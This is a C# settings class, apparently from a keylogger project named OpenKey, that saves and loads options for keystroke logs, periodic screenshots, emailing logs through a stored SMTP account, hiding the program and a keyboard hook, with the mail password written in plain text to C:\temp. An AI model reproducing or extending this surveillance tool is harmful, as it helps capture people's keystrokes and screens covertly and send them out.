using System;
using System.IO;

namespace OpenKey
{
    public static class Global
    {
        public static string file = "Settings.txt";
        public static string folder = @"C:\temp";
        //Local
        public static bool chkreglocal = false;
        public static bool chksnaplocal = false;
        public static string Location;
        public static string Namereglocal, Formatreglocal;
        public static int Nudreglocal = 10, Nudsnaplocal = 10;
        //Envíar Correo
        public static string Destino;
        public static string Email, Pass, Smtp, Port;
        public static int NudLog = 10;
        public static bool chksendmail = false, radiorigen1 = true, radiorigen2, SSL;
        //Tomar Sanapshot
        public static string NameSnap, FormatSnap;
        public static bool chksnapshot = false;
        public static int NudSnap = 10;
        //Ajustes Generales
        public static bool Hide;
        public static bool IsHook, IsHide, chkkey;
        public static string Password = "";
        //Contadores
        public static int Csnap, Creg;


        public static void Write()
        {
            Directory.CreateDirectory(folder);
            string path = Path.Combine(folder, file);
            FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write);
            fs.Close();
            StreamWriter sw = File.AppendText(path);
            sw.WriteLine(
                //Saving Local Settings
                  Location + 'À' + chkreglocal + 'À' + Namereglocal + 'À' + Formatreglocal + 'À' + Nudreglocal
                                + 'À' + chksnaplocal + 'À' + Nudsnaplocal
                //Saving Emailing Settings
                + 'À' + chksendmail + 'À' + Destino + 'À' + radiorigen1 + 'À' + radiorigen2 + 'À' + Email + 'À' + Pass + 'À' + Smtp + 'À' + Port + 'À' + SSL + 'À' + NudLog
                //Saving Snapshot Settings
                + 'À' + chksnapshot + 'À' + NameSnap + 'À' + FormatSnap + 'À' + NudSnap
                //Saving Settings
                + 'À' + Hide + 'À' + IsHook + 'À' + IsHide + 'À' + chkkey + 'À' + Password
                //Counters
                 + 'À' + Csnap + 'À' + Creg);

            sw.Close();
        }
        public static void Write(string text, string file = "reg.txt", string folder = "C:\\temp")
        {
            if (string.IsNullOrEmpty(folder)) folder = "C:\\temp";
            Directory.CreateDirectory(folder);
            string path = Path.Combine(folder, file);
            FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write);
            fs.Close();
            StreamWriter sw = File.AppendText(path);
            sw.WriteLine(text);
            sw.Close();
        }
        public static bool Load()
        {
            string path = Path.Combine(folder, file);
            if (File.Exists(path))
            {
                String line;
                StreamReader sr = new StreamReader(path);

                if ((line = sr.ReadLine()) != null)
                {
                    string[] args = line.Split('À');

                    for (int i = 0; i < args.Length; i++)
                    {
                        //Local
                        Location = args[i++];
                        chkreglocal = bool.Parse(args[i++]);
                        Namereglocal = args[i++];
                        Formatreglocal = args[i++];
                        Nudreglocal = int.Parse(args[i++]);
                        chksnaplocal = bool.Parse(args[i++]);
                        Nudsnaplocal = int.Parse(args[i++]);
                        //Email
                        chksendmail = bool.Parse(args[i++]);
                        Destino = args[i++];
                        radiorigen1 = bool.Parse(args[i++]);
                        radiorigen2 = bool.Parse(args[i++]);
                        Email = args[i++];
                        Pass = args[i++];
                        Smtp = args[i++];
                        Port = args[i++];
                        SSL = bool.Parse(args[i++]);
                        NudLog = int.Parse(args[i++]);
                        //Snapshot
                        chksnapshot = bool.Parse(args[i++]);
                        NameSnap = args[i++];
                        FormatSnap = args[i++];
                        NudSnap = int.Parse(args[i++]);
                        //Settings
                        Hide = bool.Parse(args[i++]);
                        IsHook = bool.Parse(args[i++]);
                        IsHide = bool.Parse(args[i++]);
                        chkkey = bool.Parse(args[i++]);
                        Password = args[i++];
                        //Counters
                        Csnap = int.Parse(args[i++]);
                        Creg = int.Parse(args[i++]);
                    }
                }
                sr.Close();
                return true;
            }
            return false;
        }
    }
}